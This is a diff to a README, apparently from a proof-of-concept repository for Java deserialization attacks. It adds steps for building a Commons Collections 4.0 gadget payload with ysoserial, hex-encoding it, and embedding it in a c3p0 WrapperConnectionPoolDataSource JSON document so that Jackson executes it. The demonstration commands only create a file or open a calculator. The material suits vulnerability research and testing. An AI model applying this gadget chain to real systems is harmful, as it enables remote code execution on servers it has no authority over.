@@ -8,7 +8,7 @@ mvn clean install
 ```
 
 
-## CommonsCollections2
+## Commons Collections 4.0
 Generate the payload with ysoserial:
 ```
 java -jar ysoserial-all.jar CommonsCollections2 "touch newfile" > CommonsCollections2.touchfile.payload.bin
@@ -47,3 +47,32 @@ Alternatively, the JacksonExploit_bundled_xalan_touchfile.json exploits the xala
 ```
 java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_bundled_xalan_touchfile.json
 ```
+
+## Jackson / C3PO / Commons Collections 4.0
+Use the payloads generated above for Commons Collections 4.0. The C3PO deserializer requires them in hex encoded ASCII format:
+
+```
+xxd -p CommonsCollections2.touchfile.payload.bin
+```
+
+The exploitable class is `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`. The hex encoded payload should be added to the `userOverridesAsString` field prefixed by `HexAsciiSerializedMap:` and terminated with a semicolon:
+```
+  [
+    "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+    {
+      "userOverridesAsString": "HexAsciiSerializedMap:aced00057372...;"
+    }
+  ]
+```
+
+Demonstrate the exploit with:
+
+```
+$JAVA_HOME/bin/java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_C3P0WrapperConnPool.touchfile.json
+```
+or
+```
+$JAVA_HOME/bin/java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_C3P0WrapperConnPool.gnome-calculator.json
+```
+Ignore the stacktraces. Verify that `CommonsCollections2_exploited.flag` is created or the Gnome calculator app is opened, demonstrating RCE.
+
